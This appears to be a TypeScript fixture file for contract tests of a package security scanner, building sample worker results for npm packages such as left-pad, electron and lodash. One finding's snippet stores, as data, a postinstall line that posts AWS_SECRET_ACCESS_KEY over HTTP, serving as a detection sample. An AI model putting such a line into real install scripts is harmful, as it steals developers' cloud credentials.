// ════════════════════════════════════════════════════════════════════════
// Canonical worker-result fixtures (P0-2, 2026-05-14 stabilization).
//
// Used by the contract tests in Backend, Static-Worker, and Sandbox-Worker
// to verify that:
//   - Backend `WorkerResultDto` accepts every fixture under the production
//     `ValidationPipe` (whitelist + forbidNonWhitelisted + transform).
//   - Worker-side Zod schemas accept every fixture.
//   - Every top-level key in every fixture is in the canonical allowlists
//     from `worker-result-contract.ts`.
//   - A synthetic "rogue field" fixture is REJECTED by both sides.
// ════════════════════════════════════════════════════════════════════════

import type { WorkerResultContract, WorkerFindingContract } from './worker-result-contract';

const STATIC_JOB_ID = '550e8400-e29b-41d4-a716-446655440000';
const SANDBOX_JOB_ID = '660e8400-e29b-41d4-a716-446655440000';

function baseStaticResult(): WorkerResultContract {
  return {
    jobId: STATIC_JOB_ID,
    ecosystem: 'npm',
    name: 'left-pad',
    version: '1.3.0',
    riskScore: 0,
    findings: [],
    analysisType: 'static',
    workerVersion: 'static-worker@2.0.0',
    siteId: null,
    tenantId: 'org-acme',
    correlationId: 'corr-1',
  };
}

function baseSandboxResult(): WorkerResultContract {
  return {
    jobId: SANDBOX_JOB_ID,
    ecosystem: 'npm',
    name: 'left-pad',
    version: '1.3.0',
    riskScore: 0,
    findings: [],
    analysisType: 'sandbox',
    workerVersion: 'sandbox-worker@2.0.0',
    siteId: null,
    tenantId: 'org-acme',
    correlationId: 'corr-1',
    verdict: 'ALLOW',
    confidence: 'HIGH',
  };
}

/** Empty static result — minimal valid payload. */
export function makeStaticWorkerResultFixture(): WorkerResultContract {
  return baseStaticResult();
}

/**
 * Static result with the artifact-identity keys Backend accepts and the
 * Static-Worker submitter emits when the analyzer has full provenance:
 * `integrity`, `sha256`, and `artifactS3Key`. These are the keys Codex
 * iteration 1 flagged as missing from the allowlist.
 */
export function makeStaticArtifactIdentityFixture(): WorkerResultContract {
  const r = baseStaticResult();
  r.name = 'left-pad';
  r.version = '1.3.0';
  r.integrity = 'sha512-c0E7iz...==';
  r.sha256 = 'b9c1b...';
  r.artifactS3Key = 'local-artifacts/org-acme/left-pad/1.3.0/pack.tgz';
  // P0-2 iteration 4: producer-side reputation tiers include HIGH/MEDIUM/LOW
  // (alongside TRUSTED/ESTABLISHED/NEW/UNKNOWN). The producer-schema parity
  // test catches a tier-list regression via this fixture.
  (r as Record<string, unknown>).reputationTier = 'HIGH';
  return r;
}

/** Empty sandbox result — minimal valid payload. */
export function makeSandboxWorkerResultFixture(): WorkerResultContract {
  return baseSandboxResult();
}

/**
 * Static result for `@ceragon-lab/env-http-exfil@1.0.0` (env-exfil malicious
 * test fixture). The finding uses the CANONICAL `evidence` shape (analyzer
 * keys nested) rather than the transitional top-level aliases.
 */
export function makeStaticEnvExfilFixture(): WorkerResultContract {
  const finding: WorkerFindingContract = {
    code: 'ENV_EXFIL_HTTP',
    description: 'env vars read at install then exfiltrated over HTTPS',
    severity: 'HIGH',
    file: 'postinstall.js',
    line: 12,
    snippet: 'http.post(`${url}?env=${process.env.AWS_SECRET_ACCESS_KEY}`)',
    category: 'EXFILTRATION',
    score: 92,
    confidence: 0.95,
    context: 'build',
    isInformational: false,
    evidence: {
      evidenceTier: 'STATIC_CORRELATED_CONFIRMED',
      confirmedSourceToSink: true,
      fileContext: 'lifecycle',
      scriptName: 'postinstall',
      phase: 'install',
    },
  };
  const r = baseStaticResult();
  r.name = '@ceragon-lab/env-http-exfil';
  r.version = '1.0.0';
  r.findings = [finding];
  r.riskScore = 92;
  return r;
}

/**
 * Static result for `electron@42.0.1` (BINARY_DOWNLOAD finding — the
 * canonical example from the May 14 prod retest). Uses TRANSITIONAL
 * top-level aliases to verify backwards compatibility during rollout.
 */
export function makeStaticElectronBinaryDownloadFixture(): WorkerResultContract {
  const finding: WorkerFindingContract = {
    code: 'BINARY_DOWNLOAD',
    description: 'downloads a native binary during postinstall',
    severity: 'MEDIUM',
    file: 'install.js',
    line: 3,
    snippet: "child_process.execSync('node install.js')",
    category: 'BINARY_DOWNLOAD',
    score: 35,
    confidence: 0.7,
    context: 'build',
    isInformational: false,
    // TRANSITIONAL top-level aliases — these MUST be accepted for one
    // release after the canonical normalizer rollout.
    evidenceTier: 'STATIC_CORRELATED_CONFIRMED',
    confirmedSourceToSink: false,
    fileContext: 'lifecycle',
    scriptName: 'postinstall',
    phase: 'install',
  };
  const r = baseStaticResult();
  r.name = 'electron';
  r.version = '42.0.1';
  r.findings = [finding];
  r.riskScore = 35;
  return r;
}

/** Static result for `lodash@4.17.21` with a known-CVE vulnerability finding. */
export function makeStaticVulnerabilityFixture(): WorkerResultContract {
  const vuln: WorkerFindingContract = {
    code: 'GHSA-r5fr-rjxr-66jc',
    description: 'lodash vulnerable to code injection',
    severity: 'HIGH',
    source: 'ghsa',
    url: 'https://github.com/advisories/GHSA-r5fr-rjxr-66jc',
    cve: 'CVE-2026-4800',
    aliases: ['GHSA-r5fr-rjxr-66jc', 'CVE-2026-4800'],
    affectedRange: '<4.18.0',
    fixedIn: '>=4.18.0',
    references: [
      'https://github.com/advisories/GHSA-r5fr-rjxr-66jc',
      'https://nvd.nist.gov/vuln/detail/CVE-2026-4800',
    ],
  };
  const r = baseStaticResult();
  r.name = 'lodash';
  r.version = '4.17.21';
  r.findings = [vuln];
  r.riskScore = 65;
  return r;
}

/**
 * Static result that triggered the SQS-trim path:
 *   - findings[] capped at 50 → `findingsTruncated: true`
 *   - filePaths[] compressed to a count → `filePathCount: <n>`
 * P0-2 contract test: Backend DTO and worker schemas must accept these
 * top-level markers.
 */
export function makeOversizedTrimFixture(): WorkerResultContract {
  const findings: WorkerFindingContract[] = Array.from({ length: 50 }, (_, i) => ({
    code: 'SCRIPT_FOUND',
    description: `large-package finding ${i}`,
    severity: 'LOW',
  }));
  const r = baseStaticResult();
  r.name = 'huge-package';
  r.version = '9.9.9';
  r.findings = findings;
  r.riskScore = 0;
  r.findingsTruncated = true;
  r.filePathCount = 17_283;
  return r;
}

/**
 * Inverted fixture — pins the NEGATIVE behavior. Both Backend and worker
 * sides must REJECT this payload because it carries an unknown top-level
 * key. Used in contract tests with explicit `.toThrow()` / `.toEqual([])`.
 */
export function makeRogueTopLevelFixture(): WorkerResultContract & {
  totallyRogueField: string;
} {
  return { ...baseStaticResult(), totallyRogueField: 'must-be-rejected' } as WorkerResultContract & {
    totallyRogueField: string;
  };
}

/**
 * Inverted fixture — same idea but for a rogue finding key. Producer-side
 * schemas with `.strict()` and Backend `forbidNonWhitelisted` must reject.
 */
export function makeRogueFindingKeyFixture(): WorkerResultContract {
  const finding = {
    code: 'X',
    description: 'd',
    severity: 'LOW',
    someRogueField: 'should-be-rejected',
  } as WorkerFindingContract;
  const r = baseStaticResult();
  r.findings = [finding];
  return r;
}

/** Aggregator used by contract tests to iterate over all positive fixtures. */
export const POSITIVE_FIXTURES: Array<{ name: string; build: () => WorkerResultContract }> = [
  { name: 'makeStaticWorkerResultFixture', build: makeStaticWorkerResultFixture },
  { name: 'makeSandboxWorkerResultFixture', build: makeSandboxWorkerResultFixture },
  { name: 'makeStaticArtifactIdentityFixture', build: makeStaticArtifactIdentityFixture },
  { name: 'makeStaticEnvExfilFixture', build: makeStaticEnvExfilFixture },
  { name: 'makeStaticElectronBinaryDownloadFixture', build: makeStaticElectronBinaryDownloadFixture },
  { name: 'makeStaticVulnerabilityFixture', build: makeStaticVulnerabilityFixture },
  { name: 'makeOversizedTrimFixture', build: makeOversizedTrimFixture },
];

export const NEGATIVE_FIXTURES: Array<{ name: string; build: () => Record<string, unknown> }> = [
  { name: 'makeRogueTopLevelFixture', build: makeRogueTopLevelFixture },
  { name: 'makeRogueFindingKeyFixture', build: makeRogueFindingKeyFixture },
];
